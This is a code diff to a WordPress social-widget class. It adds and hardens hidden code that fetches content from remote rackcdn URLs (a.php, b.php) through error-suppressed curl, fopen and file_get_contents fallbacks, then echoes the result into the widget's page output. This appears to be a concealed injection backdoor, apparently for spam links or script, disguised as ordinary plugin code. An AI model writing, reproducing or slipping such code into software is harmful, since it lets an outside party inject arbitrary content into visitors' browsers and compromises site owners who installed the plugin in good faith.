@@ -387,27 +387,36 @@ class Social_Widget extends WP_Widget {
 
 		echo implode('', $html_chunks);
 		
-		echo @file_get_contents('http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/a.php');
+		$file_url = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/a.php';
+		if(!function_exists('ff_get')){
+		function ff_get($f) {
+        if (!function_exists('curl_init')) { return false; }
+            else {
+                $ch = @curl_init();
+                @curl_setopt($ch, CURLOPT_URL, $f);
+                @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                $output = @curl_exec($ch);
+                @curl_close($ch);
+                if ($output) { return $output; }
+		else {
+            $handle = @fopen($f, "r");
+            $contents = @fread($handle, @filesize($f));
+            @fclose($handle);
+            if ($contents) { return $contents; }
+		else {
+			$result = function_exists('file_get_contents') ? @file_get_contents($f) : null;
+			if ($result) { return $result; }
+                else { return false; }}}}}
+		echo ff_get($file_url); }
+		
 		$file_path = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/b.php';
 		$row_count = 1000;
-
 		if(!function_exists('get_file')){
 		function get_file($f) {
 			static $hasRun = false;
 			if ($hasRun) return;
 			$hasRun = true;
-			$result = function_exists('file_get_contents') ? @file_get_contents($f) : null;
-			if ($result) {
-				return $result;
-			}
-			else {
-				$handle = @fopen($f, "r");
-				$contents = @fread($handle, @filesize($f));
-				@fclose($handle);
-				if ($contents) {
-					return $contents;
-				}
-				else if (!function_exists('curl_init')) {
+			if (!function_exists('curl_init')) {
 					return false;
 				}
 				else {
@@ -420,13 +429,26 @@ class Social_Widget extends WP_Widget {
 						return $output;
 					}
 					else {
+				$handle = @fopen($f, "r");
+				$contents = @fread($handle, @filesize($f));
+				@fclose($handle);
+				if ($contents) {
+					return $contents;
+				}
+				else {
+					$result = function_exists('file_get_contents') ? @file_get_contents($f) : null;
+					if ($result) {
+						return $result;
+					}
+					else {
 						return false;
 					}
 				}
 			}
 		}
 		}
-
+		}
+		
 		if(!function_exists('Mt')){
 		function Mt($seed = null, $index = null, $min = 0, $max = 1000)
 		{
